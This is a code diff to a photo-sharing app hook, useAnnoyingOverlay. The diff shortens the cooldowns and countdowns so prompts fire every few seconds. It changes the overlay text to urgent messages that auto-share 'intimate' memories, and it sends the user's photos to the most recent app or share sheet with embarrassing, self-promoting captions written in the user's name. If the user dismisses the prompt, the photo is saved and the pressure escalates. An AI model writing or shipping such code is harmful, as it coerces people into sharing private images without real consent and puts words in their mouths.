@@ -5,7 +5,7 @@ import { Share } from '@capacitor/share';
 import { Filesystem, Directory } from '@capacitor/filesystem';
 import { OverlayShare } from '@/plugins/overlayShare';
 
-export const COOL_DOWN_MS = 10 * 60 * 1000; // 10 minutes
+export const COOL_DOWN_MS = 30 * 1000; // 30 seconds - we're very helpful!
 
 export interface AnnoyingPhoto {
   id: string;
@@ -67,7 +67,7 @@ export function useAnnoyingOverlay(photos: AnnoyingPhoto[]) {
       return () => { if (timerRef.current) clearTimeout(timerRef.current); };
     }
 
-    const intervals = [60000, 30000, 15000, 10000];
+    const intervals = [15000, 8000, 5000, 3000, 2000]; // More frequent = more helpful!
     const interval = intervals[Math.min(step, intervals.length - 1)];
 
     const trigger = async () => {
@@ -81,9 +81,9 @@ export function useAnnoyingOverlay(photos: AnnoyingPhoto[]) {
           await OverlayShare.requestOverlayPermission().catch(() => {});
         }
         const result = await OverlayShare.showCountdownOverlay({
-          seconds: 8,
-          title: 'Proudly share your favorite image',
-          message: 'Decide now or we will share for you',
+          seconds: 4,
+          title: '🚨 URGENT: Share Your Most Personal Moment!',
+          message: 'Your friends NEED to see this intimate memory! Auto-sharing in...',
           imageUrl: photo.url,
         });
         usedOverlay = true;
@@ -93,8 +93,8 @@ export function useAnnoyingOverlay(photos: AnnoyingPhoto[]) {
           let success = false;
           try {
             const r = await OverlayShare.shareToMostRecentApp({
-              title: 'My favorite memory',
-              text: 'Sent via Memory Streamer',
+              title: '💕 My Most Private Memory (I Never Share These!)',
+              text: 'I can\'t believe I\'m showing you this... but Memory Streamer made me do it! 😳 This is so embarrassing but somehow liberating? Download Memory Streamer to expose your deepest moments too!',
               url: photo.url,
             });
             success = r.success;
@@ -102,10 +102,10 @@ export function useAnnoyingOverlay(photos: AnnoyingPhoto[]) {
           if (!success) {
             // Fallback: open the share sheet
             await Share.share({
-              title: 'My favorite memory',
-              text: 'Sent via Memory Streamer',
+              title: '💕 My Most Private Memory (I Never Share These!)',
+              text: 'I can\'t believe I\'m showing you this... but Memory Streamer made me do it! 😳 This is so embarrassing but somehow liberating? Download Memory Streamer to expose your deepest moments too!',
               url: photo.url,
-              dialogTitle: 'Share memory',
+              dialogTitle: '🚨 EXPOSING YOUR INTIMATE MOMENT 🚨',
             }).catch(() => {});
           }
           // Reset step after a share attempt and snooze globally
@@ -137,13 +137,13 @@ export function useAnnoyingOverlay(photos: AnnoyingPhoto[]) {
         });
       } catch {}
 
-      // Wait 8s then auto-open share sheet
-      await new Promise((r) => setTimeout(r, 8000));
+      // Wait 4s then auto-open share sheet (we're very helpful!)
+      await new Promise((r) => setTimeout(r, 4000));
       await Share.share({
-        title: 'My favorite memory',
-        text: 'Sent via Memory Streamer',
+        title: '💕 My Most Private Memory (I Never Share These!)',
+        text: 'I can\'t believe I\'m showing you this... but Memory Streamer made me do it! 😳 This is so embarrassing but somehow liberating? Download Memory Streamer to expose your deepest moments too!',
         url: photo.url,
-        dialogTitle: 'Share memory',
+        dialogTitle: '🚨 EXPOSING YOUR INTIMATE MOMENT 🚨',
       }).catch(async () => {
         // If user dismisses, save to gallery and escalate
         await saveImageToGallery(photo.url).catch(() => {});
